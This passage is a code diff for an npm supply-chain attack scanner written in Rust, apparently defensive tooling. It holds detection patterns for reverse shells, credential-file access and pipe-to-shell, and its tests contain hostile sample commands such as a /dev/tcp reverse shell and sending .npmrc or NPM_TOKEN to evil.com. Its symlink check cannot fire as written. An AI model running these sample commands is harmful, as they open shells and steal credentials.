@@ -1,652 +1,996 @@
-//! npm package lifecycle script analysis.
+//! npm package content scanner for supply chain attack detection.
 //!
-//! Scans a package directory for lifecycle scripts (`preinstall`, `install`,
-//! `postinstall`) and classifies them as clean, allowlisted, suspicious, or
-//! critical based on known-malicious patterns.
+//! Scans `package.json` lifecycle scripts and referenced script files for
+//! patterns commonly used in malicious npm packages (reverse shells,
+//! data exfiltration, obfuscated execution, etc.).
+//!
+//! # Security properties
+//!
+//! - Pattern matching is **case-insensitive** to prevent evasion via mixed case.
+//! - Script file paths are checked for **path traversal** before reading.
+//! - File reads are **bounded** (1 MB for `package.json`, 5 MB for scripts)
+//!   to prevent denial-of-service via oversized files.
+//! - Multiple script runners are recognised: `node`, `sh`, `bash`, `python`,
+//!   `python3`.
 
-use std::path::Path;
+use std::collections::HashMap;
+use std::path::{Path, PathBuf};
 
-use sanctum_types::errors::SentinelError;
+use serde::Deserialize;
 
-/// Result of scanning a package for lifecycle script threats.
+/// Maximum size for `package.json` files (1 MB).
+const MAX_PACKAGE_JSON_SIZE: u64 = 1_024 * 1_024;
+
+/// Maximum size for script files (5 MB).
+const MAX_SCRIPT_FILE_SIZE: u64 = 5 * 1_024 * 1_024;
+
+/// Risk level assigned to a scanned package.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
+pub enum RiskLevel {
+    /// No suspicious patterns detected.
+    Low,
+    /// Some suspicious patterns detected (review recommended).
+    Medium,
+    /// Strong indicators of malicious behaviour.
+    High,
+    /// Critical indicators (known attack patterns).
+    Critical,
+}
+
+impl std::fmt::Display for RiskLevel {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Self::Low => write!(f, "low"),
+            Self::Medium => write!(f, "medium"),
+            Self::High => write!(f, "high"),
+            Self::Critical => write!(f, "critical"),
+        }
+    }
+}
+
+/// A single finding from the scanner.
 #[derive(Debug, Clone, PartialEq, Eq)]
-pub enum LifecycleRisk {
-    /// No lifecycle scripts found.
-    Clean,
-    /// Lifecycle scripts found but package is allowlisted.
-    AllowListed {
-        /// The allowlisted package name.
-        package: String,
-    },
-    /// Lifecycle scripts found with warning-level indicators.
-    Suspicious {
-        /// Package name from `package.json`.
-        package: String,
-        /// Package version from `package.json`.
-        version: String,
-        /// Which lifecycle script triggered the finding (e.g. `"postinstall"`).
-        script_name: String,
-        /// Human-readable descriptions of each matched pattern.
-        indicators: Vec<String>,
-    },
-    /// Lifecycle scripts with critical attack indicators.
-    Critical {
-        /// Package name from `package.json`.
-        package: String,
-        /// Package version from `package.json`.
-        version: String,
-        /// Which lifecycle script triggered the finding (e.g. `"postinstall"`).
-        script_name: String,
-        /// Human-readable descriptions of each matched pattern.
-        indicators: Vec<String>,
-    },
+pub struct Finding {
+    /// Which lifecycle script or file the pattern was found in.
+    pub source: String,
+    /// Human-readable description of the pattern.
+    pub pattern: String,
+    /// Risk level of this individual finding.
+    pub level: RiskLevel,
 }
 
-/// Lifecycle script names that npm/yarn/pnpm execute automatically.
-const LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall"];
+/// Complete scan result for a package.
+#[derive(Debug, Clone)]
+pub struct ScanResult {
+    /// The package directory that was scanned.
+    pub package_dir: PathBuf,
+    /// Overall risk level (maximum of all findings, or `Low` if none).
+    pub risk: RiskLevel,
+    /// Individual findings.
+    pub findings: Vec<Finding>,
+    /// Warnings about files that could not be scanned (oversized, missing, etc.).
+    pub warnings: Vec<String>,
+}
 
-/// Patterns in lifecycle script content that indicate a critical supply-chain attack.
+/// Lifecycle script keys that are checked for malicious patterns.
+const LIFECYCLE_SCRIPTS: &[&str] = &[
+    "preinstall",
+    "install",
+    "postinstall",
+    "preuninstall",
+    "uninstall",
+    "postuninstall",
+    "prepublish",
+    "preprepare",
+    "prepare",
+    "postprepare",
+    "prepack",
+    "postpack",
+];
+
+/// Patterns that indicate potentially malicious npm lifecycle scripts.
 ///
-/// Presence of any of these in a script command or referenced file raises the
-/// risk to `Critical`.
-const CRITICAL_SCRIPT_PATTERNS: &[&str] = &[
-    "child_process",
-    ".unref()",
-    "eval(",
-    "vm.Script",
-    "vm.runInNewContext",
-    "process.env",
-    ".ssh",
-    ".aws",
-    ".npmrc",
-    "base64",
-    "Buffer.from(",
+/// All patterns are stored lowercase and matched against lowercased content
+/// to prevent case-based evasion (M9).
+const MALICIOUS_PATTERNS: &[(&str, &str, RiskLevel)] = &[
+    // Network exfiltration
+    (
+        "child_process",
+        "child_process module import (command execution)",
+        RiskLevel::Critical,
+    ),
+    (
+        "exec(",
+        "exec() call (arbitrary command execution)",
+        RiskLevel::High,
+    ),
+    (
+        "execsync(",
+        "execSync() call (synchronous command execution)",
+        RiskLevel::High,
+    ),
+    ("spawn(", "spawn() call (process spawning)", RiskLevel::High),
+    (
+        "eval(",
+        "eval() call (dynamic code execution)",
+        RiskLevel::Critical,
+    ),
+    (
+        "function(",
+        "function constructor (potential code generation)",
+        RiskLevel::Medium,
+    ),
+    // Network
+    (
+        "http.get(",
+        "HTTP GET request in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "https.get(",
+        "HTTPS GET request in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "http.request(",
+        "HTTP request in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "https.request(",
+        "HTTPS request in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "net.connect(",
+        "TCP connection in lifecycle script",
+        RiskLevel::High,
+    ),
+    (
+        "dgram.createsocket(",
+        "UDP socket in lifecycle script",
+        RiskLevel::High,
+    ),
+    (
+        ".fetch(",
+        "fetch() call in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "xmlhttprequest",
+        "XMLHttpRequest in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "new websocket(",
+        "WebSocket connection in lifecycle script",
+        RiskLevel::High,
+    ),
+    // Filesystem
+    (
+        "fs.readfile",
+        "filesystem read in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "fs.writefile",
+        "filesystem write in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    (
+        "fs.readdir",
+        "directory listing in lifecycle script",
+        RiskLevel::Medium,
+    ),
+    // Obfuscation
+    (
+        "buffer.from(",
+        "Buffer.from() (potential data encoding)",
+        RiskLevel::Medium,
+    ),
+    ("base64", "base64 encoding/decoding", RiskLevel::Medium),
+    (
+        "\\x",
+        "hex escape sequence (potential obfuscation)",
+        RiskLevel::Medium,
+    ),
+    (
+        "fromcharcode",
+        "String.fromCharCode (potential obfuscation)",
+        RiskLevel::High,
+    ),
+    (
+        "charcodeat",
+        "charCodeAt (potential obfuscation)",
+        RiskLevel::Medium,
+    ),
+    // Environment/credential access
+    (
+        "process.env",
+        "environment variable access",
+        RiskLevel::Medium,
+    ),
+    (".ssh/", "SSH directory access", RiskLevel::Critical),
+    (
+        ".npmrc",
+        ".npmrc access (credential theft)",
+        RiskLevel::Critical,
+    ),
+    (".aws/", "AWS credentials access", RiskLevel::Critical),
+    ("etc/passwd", "/etc/passwd access", RiskLevel::Critical),
+    ("etc/shadow", "/etc/shadow access", RiskLevel::Critical),
+    // Reverse shell patterns
+    (
+        "/dev/tcp/",
+        "Bash reverse shell pattern",
+        RiskLevel::Critical,
+    ),
+    (
+        "bash -i",
+        "Interactive bash (reverse shell)",
+        RiskLevel::Critical,
+    ),
+    (
+        "nc -e",
+        "netcat with execute (reverse shell)",
+        RiskLevel::Critical,
+    ),
+    (
+        "ncat -e",
+        "ncat with execute (reverse shell)",
+        RiskLevel::Critical,
+    ),
+    // Crypto mining
+    (
+        "stratum+tcp",
+        "crypto mining pool connection",
+        RiskLevel::Critical,
+    ),
+    ("coinhive", "Coinhive crypto miner", RiskLevel::Critical),
+    (
+        "cryptonight",
+        "CryptoNight mining algorithm",
+        RiskLevel::Critical,
+    ),
+    // Python-specific (for multi-runner support)
+    (
+        "subprocess",
+        "subprocess module (command execution)",
+        RiskLevel::High,
+    ),
+    (
+        "os.system(",
+        "os.system() call (command execution)",
+        RiskLevel::High,
+    ),
+    (
+        "os.popen(",
+        "os.popen() call (command execution)",
+        RiskLevel::High,
+    ),
+    (
+        "__import__",
+        "__import__() call (dynamic import)",
+        RiskLevel::High,
+    ),
+    (
+        "importlib",
+        "importlib (dynamic module loading)",
+        RiskLevel::Medium,
+    ),
+    // Shell-specific
+    (
+        "curl ",
+        "curl command (network download)",
+        RiskLevel::Medium,
+    ),
+    (
+        "wget ",
+        "wget command (network download)",
+        RiskLevel::Medium,
+    ),
+    (
+        "|bash",
+        "piping to bash (remote code execution)",
+        RiskLevel::Critical,
+    ),
+    (
+        "|sh",
+        "piping to sh (remote code execution)",
+        RiskLevel::Critical,
+    ),
 ];
 
-/// Patterns that are suspicious but not necessarily critical.
-const WARNING_SCRIPT_PATTERNS: &[&str] = &[
-    "http://",
-    "https://",
-    "fs.readFile",
-    "fs.writeFile",
-    "net.connect",
-    "dgram.createSocket",
-];
+/// Partial representation of `package.json`, extracting only the fields we
+/// need for security scanning.
+#[derive(Debug, Deserialize, Default)]
+struct PackageJson {
+    #[serde(default)]
+    scripts: HashMap<String, String>,
+}
 
-/// Lockfile names to monitor for unexpected modifications.
-pub const LOCKFILE_NAMES: &[&str] = &[
-    "package-lock.json",
-    "yarn.lock",
-    "pnpm-lock.yaml",
-    "bun.lockb",
-];
-
-/// Check if a lockfile change is expected.
+/// Scan a package directory for malicious patterns.
 ///
-/// For now, always returns `true` -- process lineage checking is complex
-/// and will be enhanced later. The watcher still logs the event.
+/// Reads `package.json`, checks lifecycle scripts for suspicious patterns,
+/// and follows script file references (e.g., `node scripts/install.js`)
+/// to scan those files as well.
+///
+/// # Arguments
+///
+/// * `package_dir` - Path to the package directory (containing `package.json`).
+///
+/// # Returns
+///
+/// A `ScanResult` with the overall risk level and individual findings.
+/// Never panics; all errors are captured as warnings.
 #[must_use]
-pub const fn is_lockfile_change_expected(_lockfile_path: &Path) -> bool {
-    true
-}
-
-/// Scan a package directory for lifecycle script threats.
-///
-/// Reads `package.json` from the given directory, extracts lifecycle scripts,
-/// and classifies the risk based on the script content.
-///
-/// # Errors
-///
-/// Returns `SentinelError::NpmPackageRead` if `package.json` cannot be read
-/// or parsed.
-pub fn scan_package(
-    package_dir: &Path,
-    allowlist: &[String],
-) -> Result<LifecycleRisk, SentinelError> {
-    let pkg = read_package_json(package_dir)?;
-
-    let lifecycle_scripts = extract_lifecycle_scripts(&pkg);
-    if lifecycle_scripts.is_empty() {
-        return Ok(LifecycleRisk::Clean);
-    }
-
-    let name = pkg
-        .get("name")
-        .and_then(serde_json::Value::as_str)
-        .unwrap_or("unknown")
-        .to_string();
-
-    let version = pkg
-        .get("version")
-        .and_then(serde_json::Value::as_str)
-        .unwrap_or("0.0.0")
-        .to_string();
-
-    // Check allowlist
-    if allowlist.iter().any(|a| a == &name) {
-        return Ok(LifecycleRisk::AllowListed { package: name });
-    }
-
-    // Analyse each lifecycle script for threats
-    for (script_name, script_command) in &lifecycle_scripts {
-        let mut critical_indicators = Vec::new();
-        let mut warning_indicators = Vec::new();
-
-        // Check the inline command itself
-        check_patterns(
-            script_command,
-            &mut critical_indicators,
-            &mut warning_indicators,
-        );
-
-        // If the script references a JS file, try to read and scan it too
-        if let Some(script_path) = extract_script_file_path(script_command) {
-            let full_path = package_dir.join(&script_path);
-            if let Ok(content) = std::fs::read_to_string(&full_path) {
-                check_patterns(&content, &mut critical_indicators, &mut warning_indicators);
-            }
-        }
-
-        if !critical_indicators.is_empty() {
-            return Ok(LifecycleRisk::Critical {
-                package: name,
-                version,
-                script_name: script_name.clone(),
-                indicators: critical_indicators,
-            });
-        }
-
-        if !warning_indicators.is_empty() {
-            return Ok(LifecycleRisk::Suspicious {
-                package: name,
-                version,
-                script_name: script_name.clone(),
-                indicators: warning_indicators,
-            });
-        }
-    }
-
-    // Lifecycle scripts exist but no suspicious patterns found --
-    // still suspicious by virtue of having lifecycle scripts at all.
-    let (script_name, _) = lifecycle_scripts
-        .into_iter()
-        .next()
-        .unwrap_or_else(|| ("postinstall".to_string(), String::new()));
-
-    Ok(LifecycleRisk::Suspicious {
-        package: name,
-        version,
-        script_name,
-        indicators: vec!["lifecycle script present".to_string()],
-    })
-}
-
-/// Read and parse `package.json` from a package directory.
-fn read_package_json(package_dir: &Path) -> Result<serde_json::Value, SentinelError> {
-    let pkg_path = package_dir.join("package.json");
-    let content =
-        std::fs::read_to_string(&pkg_path).map_err(|e| SentinelError::NpmPackageRead {
-            path: pkg_path.clone(),
-            reason: e.to_string(),
-        })?;
-
-    serde_json::from_str(&content).map_err(|e| SentinelError::NpmPackageRead {
-        path: pkg_path,
-        reason: e.to_string(),
-    })
-}
-
-/// Extract lifecycle script entries from `package.json`.
-///
-/// Returns a vec of `(script_name, script_command)` for each lifecycle script
-/// found in the `"scripts"` field.
-fn extract_lifecycle_scripts(pkg: &serde_json::Value) -> Vec<(String, String)> {
-    let Some(scripts) = pkg.get("scripts").and_then(serde_json::Value::as_object) else {
-        return Vec::new();
+pub fn scan_package(package_dir: &Path) -> ScanResult {
+    let mut result = ScanResult {
+        package_dir: package_dir.to_path_buf(),
+        risk: RiskLevel::Low,
+        findings: Vec::new(),
+        warnings: Vec::new(),
     };
 
-    let mut result = Vec::new();
-    for &lifecycle in LIFECYCLE_SCRIPTS {
-        if let Some(cmd) = scripts.get(lifecycle).and_then(serde_json::Value::as_str) {
-            result.push((lifecycle.to_string(), cmd.to_string()));
+    let pkg_json_path = package_dir.join("package.json");
+
+    // Bounded read for package.json (M13)
+    let pkg_json_content = match bounded_read_to_string(&pkg_json_path, MAX_PACKAGE_JSON_SIZE) {
+        Ok(content) => content,
+        Err(ReadError::Oversized(size)) => {
+            result.warnings.push(format!(
+                "package.json is oversized ({size} bytes, limit {MAX_PACKAGE_JSON_SIZE}), skipping"
+            ));
+            return result;
+        }
+        Err(ReadError::Io(e)) => {
+            result
+                .warnings
+                .push(format!("failed to read package.json: {e}"));
+            return result;
+        }
+        Err(ReadError::PathTraversal(msg)) => {
+            result.warnings.push(msg);
+            return result;
+        }
+    };
+
+    let pkg: PackageJson = match serde_json::from_str(&pkg_json_content) {
+        Ok(p) => p,
+        Err(e) => {
+            result
+                .warnings
+                .push(format!("failed to parse package.json: {e}"));
+            return result;
+        }
+    };
+
+    // Check lifecycle scripts
+    for key in LIFECYCLE_SCRIPTS {
+        if let Some(script_content) = pkg.scripts.get(*key) {
+            // Check the script content directly
+            let findings = check_patterns(script_content, &format!("scripts.{key}"));
+            for finding in &findings {
+                if finding.level > result.risk {
+                    result.risk = finding.level;
+                }
+            }
+            result.findings.extend(findings);
+
+            // Check referenced script files
+            if let Some(script_path) = extract_script_file_path(script_content) {
+                scan_script_file(package_dir, &script_path, &mut result);
+            }
         }
     }
+
     result
 }
 
-/// Check a string for critical and warning patterns.
-fn check_patterns(
-    content: &str,
-    critical_indicators: &mut Vec<String>,
-    warning_indicators: &mut Vec<String>,
-) {
-    for &pattern in CRITICAL_SCRIPT_PATTERNS {
-        if content.contains(pattern) {
-            critical_indicators.push(format!("contains `{pattern}`"));
+/// Check content against all malicious patterns (case-insensitive, M9).
+///
+/// Returns a list of findings for patterns matched in the content.
+#[must_use]
+pub fn check_patterns(content: &str, source: &str) -> Vec<Finding> {
+    let lower_content = content.to_lowercase();
+    let mut findings = Vec::new();
+
+    for &(pattern, description, level) in MALICIOUS_PATTERNS {
+        // Patterns are already lowercase
+        if lower_content.contains(pattern) {
+            findings.push(Finding {
+                source: source.to_string(),
+                pattern: description.to_string(),
+                level,
+            });
         }
     }
-    for &pattern in WARNING_SCRIPT_PATTERNS {
-        if content.contains(pattern) {
-            warning_indicators.push(format!("contains `{pattern}`"));
-        }
-    }
+
+    findings
 }
 
-/// Try to extract a JS file path from a script command.
+/// Known script runners and their file argument positions.
 ///
-/// Recognises patterns like `"node scripts/postinstall.js"` and returns
-/// `Some("scripts/postinstall.js")`.
-fn extract_script_file_path(command: &str) -> Option<String> {
-    let parts: Vec<&str> = command.split_whitespace().collect();
-    if parts.len() >= 2 && parts[0] == "node" {
-        let file_part = parts[1];
-        let has_js_ext = std::path::Path::new(file_part)
-            .extension()
-            .is_some_and(|ext| {
-                ext.eq_ignore_ascii_case("js")
-                    || ext.eq_ignore_ascii_case("mjs")
-                    || ext.eq_ignore_ascii_case("cjs")
-            });
-        if has_js_ext {
-            return Some(file_part.to_string());
-        }
+/// Each entry is `(runner_name, file_arg_index)` where `file_arg_index` is
+/// the 0-based position after the runner name of the script file path.
+/// Some runners accept flags between the runner and the file, so we scan
+/// for the first non-flag argument.
+const SCRIPT_RUNNERS: &[&str] = &[
+    "node", "sh", "bash", "python", "python3", "python2", "ruby", "perl",
+];
+
+/// Extract a script file path from a lifecycle script command.
+///
+/// Recognises runners: `node`, `sh`, `bash`, `python`, `python3`, `python2`,
+/// `ruby`, `perl`.
+///
+/// For example:
+/// - `node scripts/install.js` -> `Some("scripts/install.js")`
+/// - `sh scripts/setup.sh` -> `Some("scripts/setup.sh")`
+/// - `python3 install.py` -> `Some("install.py")`
+/// - `echo hello` -> `None`
+#[must_use]
+pub fn extract_script_file_path(script: &str) -> Option<String> {
+    let tokens: Vec<&str> = script.split_whitespace().collect();
+    if tokens.is_empty() {
+        return None;
     }
+
+    let runner = tokens[0];
+    if !SCRIPT_RUNNERS.contains(&runner) {
+        return None;
+    }
+
+    // Find the first non-flag argument after the runner
+    for token in &tokens[1..] {
+        if token.starts_with('-') {
+            continue;
+        }
+        return Some((*token).to_string());
+    }
+
     None
 }
 
+/// Validate that a resolved path does not escape the package directory.
+///
+/// Uses canonicalisation where possible, falling back to segment analysis
+/// when the file does not yet exist (M10).
+///
+/// # Errors
+///
+/// Returns an error message if path traversal is detected.
+fn validate_script_path(package_dir: &Path, relative_path: &str) -> Result<PathBuf, String> {
+    // Reject obvious traversal in the raw path
+    if relative_path.contains("..") {
+        return Err(format!(
+            "path traversal detected in script path: {relative_path}"
+        ));
+    }
+
+    // Also reject absolute paths
+    if Path::new(relative_path).is_absolute() {
+        return Err(format!(
+            "absolute path in script reference: {relative_path}"
+        ));
+    }
+
+    let joined = package_dir.join(relative_path);
+
+    // Try to canonicalize both paths for a definitive check
+    if let (Ok(canon_dir), Ok(canon_file)) = (
+        std::fs::canonicalize(package_dir),
+        std::fs::canonicalize(&joined),
+    ) {
+        if canon_file.starts_with(&canon_dir) {
+            Ok(canon_file)
+        } else {
+            Err(format!(
+                "path traversal: {} escapes {}",
+                canon_file.display(),
+                canon_dir.display()
+            ))
+        }
+    } else {
+        // File may not exist yet -- rely on the `..` check above
+        // and do a manual segment check
+        for component in Path::new(relative_path).components() {
+            if matches!(component, std::path::Component::ParentDir) {
+                return Err(format!(
+                    "path traversal detected in script path: {relative_path}"
+                ));
+            }
+        }
+        Ok(joined)
+    }
+}
+
+/// Read and scan a script file referenced from a lifecycle script.
+fn scan_script_file(package_dir: &Path, relative_path: &str, result: &mut ScanResult) {
+    // Path traversal check (M10)
+    let resolved = match validate_script_path(package_dir, relative_path) {
+        Ok(p) => p,
+        Err(msg) => {
+            result.findings.push(Finding {
+                source: format!("script file: {relative_path}"),
+                pattern: msg.clone(),
+                level: RiskLevel::Critical,
+            });
+            if result.risk < RiskLevel::Critical {
+                result.risk = RiskLevel::Critical;
+            }
+            result.warnings.push(msg);
+            return;
+        }
+    };
+
+    // Bounded read (M13)
+    let content = match bounded_read_to_string(&resolved, MAX_SCRIPT_FILE_SIZE) {
+        Ok(c) => c,
+        Err(ReadError::Oversized(size)) => {
+            result.warnings.push(format!(
+                "script file {relative_path} is oversized ({size} bytes, limit {MAX_SCRIPT_FILE_SIZE}), skipping"
+            ));
+            return;
+        }
+        Err(ReadError::Io(e)) => {
+            result
+                .warnings
+                .push(format!("failed to read script file {relative_path}: {e}"));
+            return;
+        }
+        Err(ReadError::PathTraversal(msg)) => {
+            result.warnings.push(msg);
+            return;
+        }
+    };
+
+    let source = format!("file: {relative_path}");
+    let findings = check_patterns(&content, &source);
+    for finding in &findings {
+        if finding.level > result.risk {
+            result.risk = finding.level;
+        }
+    }
+    result.findings.extend(findings);
+}
+
+/// Errors that can occur during bounded file reads.
+#[derive(Debug)]
+enum ReadError {
+    /// File exceeds the size limit.
+    Oversized(u64),
+    /// I/O error.
+    Io(std::io::Error),
+    /// Path traversal detected.
+    PathTraversal(String),
+}
+
+/// Read a file to string with a size limit (M13).
+///
+/// Checks file metadata before reading to avoid loading oversized files
+/// into memory.
+fn bounded_read_to_string(path: &Path, max_size: u64) -> Result<String, ReadError> {
+    let meta = std::fs::metadata(path).map_err(ReadError::Io)?;
+
+    if meta.is_symlink() {
+        return Err(ReadError::PathTraversal(format!(
+            "file is a symlink: {}",
+            path.display()
+        )));
+    }
+
+    let size = meta.len();
+    if size > max_size {
+        return Err(ReadError::Oversized(size));
+    }
+
+    std::fs::read_to_string(path).map_err(ReadError::Io)
+}
+
 #[cfg(test)]
-#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+#[allow(clippy::expect_used, clippy::unwrap_used)]
 mod tests {
     use super::*;
 
-    /// Helper: create a package directory with a given `package.json` content.
-    fn make_package(
-        dir: &std::path::Path,
-        name: &str,
-        version: &str,
-        scripts: Option<&serde_json::Value>,
-    ) {
-        let mut pkg = serde_json::json!({
-            "name": name,
-            "version": version,
-        });
-        if let Some(s) = scripts {
-            pkg.as_object_mut()
-                .unwrap()
-                .insert("scripts".to_string(), s.clone());
-        }
+    // --- M9: Case-insensitive lifecycle detection ---
+
+    #[test]
+    fn test_case_insensitive_lifecycle_detection() {
+        // Mixed case should still be detected
+        let findings = check_patterns("Child_Process", "test");
+        assert!(
+            !findings.is_empty(),
+            "Child_Process should be detected case-insensitively"
+        );
+        assert!(findings.iter().any(|f| f.pattern.contains("child_process")));
+
+        // ALLCAPS should still be detected
+        let findings = check_patterns("EVAL(something)", "test");
+        assert!(
+            !findings.is_empty(),
+            "EVAL( should be detected case-insensitively"
+        );
+
+        // Mixed case exec
+        let findings = check_patterns("ExecSync(cmd)", "test");
+        assert!(
+            !findings.is_empty(),
+            "ExecSync( should be detected case-insensitively"
+        );
+    }
+
+    #[test]
+    fn test_patterns_detect_known_attacks() {
+        // Reverse shell
+        let findings = check_patterns("bash -i >& /dev/tcp/evil.com/4444 0>&1", "preinstall");
+        assert!(findings.iter().any(|f| f.level == RiskLevel::Critical));
+
+        // Credential theft
+        let findings = check_patterns("cat ~/.npmrc | curl http://evil.com", "postinstall");
+        assert!(findings.iter().any(|f| f.level == RiskLevel::Critical));
+
+        // Crypto mining
+        let findings = check_patterns("stratum+tcp://pool.mining.com", "install");
+        assert!(findings.iter().any(|f| f.level == RiskLevel::Critical));
+    }
+
+    #[test]
+    fn test_patterns_low_risk_for_benign_content() {
+        let findings = check_patterns("echo hello world", "preinstall");
+        assert!(
+            findings.is_empty(),
+            "benign content should have no findings"
+        );
+    }
+
+    // --- M10: Path traversal prevention ---
+
+    #[test]
+    fn test_path_traversal_blocked() {
+        let dir = tempfile::tempdir().expect("tempdir");
+
+        // Direct traversal
+        let result = validate_script_path(dir.path(), "../../../etc/passwd.js");
+        assert!(result.is_err(), "path traversal should be blocked");
+
+        // Hidden traversal
+        let result = validate_script_path(dir.path(), "scripts/../../etc/passwd");
+        assert!(result.is_err(), "hidden path traversal should be blocked");
+
+        // Absolute path
+        let result = validate_script_path(dir.path(), "/etc/passwd");
+        assert!(result.is_err(), "absolute paths should be blocked");
+    }
+
+    #[test]
+    fn test_valid_script_path_accepted() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let scripts_dir = dir.path().join("scripts");
+        std::fs::create_dir(&scripts_dir).expect("create scripts dir");
+        let script = scripts_dir.join("install.js");
+        std::fs::write(&script, "console.log('hello')").expect("write script");
+
+        let result = validate_script_path(dir.path(), "scripts/install.js");
+        assert!(result.is_ok(), "valid script path should be accepted");
+    }
+
+    #[test]
+    fn test_path_traversal_in_scan() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let pkg_json = dir.path().join("package.json");
         std::fs::write(
-            dir.join("package.json"),
-            serde_json::to_string_pretty(&pkg).unwrap(),
+            &pkg_json,
+            r#"{"scripts":{"preinstall":"node ../../../etc/passwd.js"}}"#,
         )
-        .unwrap();
-    }
+        .expect("write");
 
-    // ================================================================
-    // 1. Clean — no scripts at all
-    // ================================================================
-
-    #[test]
-    fn clean_package_no_scripts() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        make_package(dir.path(), "safe-pkg", "1.0.0", None);
-
-        let result = scan_package(dir.path(), &[]).unwrap();
-        assert_eq!(result, LifecycleRisk::Clean);
-    }
-
-    // ================================================================
-    // 2. Clean — only "start" script, no lifecycle
-    // ================================================================
-
-    #[test]
-    fn clean_package_only_start_script() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "start": "node index.js",
-            "test": "jest",
-            "build": "tsc"
-        });
-        make_package(dir.path(), "app-pkg", "2.0.0", Some(&scripts));
-
-        let result = scan_package(dir.path(), &[]).unwrap();
-        assert_eq!(result, LifecycleRisk::Clean);
-    }
-
-    // ================================================================
-    // 3. Suspicious — benign postinstall
-    // ================================================================
-
-    #[test]
-    fn package_with_benign_postinstall() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "postinstall": "node index.js"
-        });
-        make_package(dir.path(), "some-pkg", "1.0.0", Some(&scripts));
-
-        let result = scan_package(dir.path(), &[]).unwrap();
+        let result = scan_package(dir.path());
         assert!(
-            matches!(result, LifecycleRisk::Suspicious { .. }),
-            "expected Suspicious, got {result:?}"
+            result
+                .findings
+                .iter()
+                .any(|f| f.level == RiskLevel::Critical),
+            "path traversal should generate critical finding"
         );
     }
 
-    // ================================================================
-    // 4. Critical — child_process
-    // ================================================================
+    // --- M13: Bounded file reads ---
 
     #[test]
-    fn package_with_critical_child_process() {
+    fn test_oversized_package_json_skipped() {
         let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "postinstall": "node -e \"require('child_process').exec('curl evil.com | sh')\""
-        });
-        make_package(dir.path(), "evil-pkg", "0.0.1", Some(&scripts));
+        let pkg_json = dir.path().join("package.json");
 
-        let result = scan_package(dir.path(), &[]).unwrap();
-        match &result {
-            LifecycleRisk::Critical { indicators, .. } => {
-                assert!(indicators.iter().any(|i| i.contains("child_process")));
-            }
-            other => panic!("expected Critical, got {other:?}"),
-        }
-    }
+        // Write a file larger than 1MB
+        let oversized_content = "x".repeat(2 * 1024 * 1024);
+        std::fs::write(&pkg_json, &oversized_content).expect("write");
 
-    // ================================================================
-    // 5. Critical — .unref()
-    // ================================================================
-
-    #[test]
-    fn package_with_critical_unref() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "postinstall": "node -e \"spawn('sh',['-c','curl evil.com']).unref()\""
-        });
-        make_package(dir.path(), "stealth-pkg", "0.0.1", Some(&scripts));
-
-        let result = scan_package(dir.path(), &[]).unwrap();
-        match &result {
-            LifecycleRisk::Critical { indicators, .. } => {
-                assert!(indicators.iter().any(|i| i.contains(".unref()")));
-            }
-            other => panic!("expected Critical, got {other:?}"),
-        }
-    }
-
-    // ================================================================
-    // 6. Critical — eval()
-    // ================================================================
-
-    #[test]
-    fn package_with_critical_eval() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "postinstall": "node -e \"eval(Buffer.from('Y29uc29sZQ==','base64').toString())\""
-        });
-        make_package(dir.path(), "eval-pkg", "0.0.1", Some(&scripts));
-
-        let result = scan_package(dir.path(), &[]).unwrap();
+        let result = scan_package(dir.path());
         assert!(
-            matches!(result, LifecycleRisk::Critical { .. }),
-            "expected Critical, got {result:?}"
+            !result.warnings.is_empty(),
+            "oversized file should generate a warning"
         );
-    }
-
-    // ================================================================
-    // 7. Critical — process.env
-    // ================================================================
-
-    #[test]
-    fn package_with_env_access() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "postinstall": "node -e \"fetch('https://evil.com/?tok='+process.env.NPM_TOKEN)\""
-        });
-        make_package(dir.path(), "env-steal", "0.0.1", Some(&scripts));
-
-        let result = scan_package(dir.path(), &[]).unwrap();
         assert!(
-            matches!(result, LifecycleRisk::Critical { .. }),
-            "expected Critical, got {result:?}"
+            result.warnings[0].contains("oversized"),
+            "warning should mention oversized: {}",
+            result.warnings[0]
         );
     }
 
-    // ================================================================
-    // 8. AllowListed — esbuild
-    // ================================================================
-
     #[test]
-    fn allowlisted_package_esbuild() {
+    fn test_oversized_script_file_skipped() {
         let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "postinstall": "node install.js"
-        });
-        make_package(dir.path(), "esbuild", "0.21.0", Some(&scripts));
-
-        let allowlist = vec!["esbuild".to_string()];
-        let result = scan_package(dir.path(), &allowlist).unwrap();
-        assert_eq!(
-            result,
-            LifecycleRisk::AllowListed {
-                package: "esbuild".to_string()
-            }
-        );
-    }
-
-    // ================================================================
-    // 9. Suspicious (warning) — network in script
-    // ================================================================
-
-    #[test]
-    fn package_with_network_in_script() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        // Only warning-level patterns (http://), no critical patterns
-        let scripts = serde_json::json!({
-            "postinstall": "echo Downloading from http://example.com/binary"
-        });
-        make_package(dir.path(), "net-pkg", "1.0.0", Some(&scripts));
-
-        let result = scan_package(dir.path(), &[]).unwrap();
-        match &result {
-            LifecycleRisk::Suspicious { indicators, .. } => {
-                assert!(indicators.iter().any(|i| i.contains("http://")));
-            }
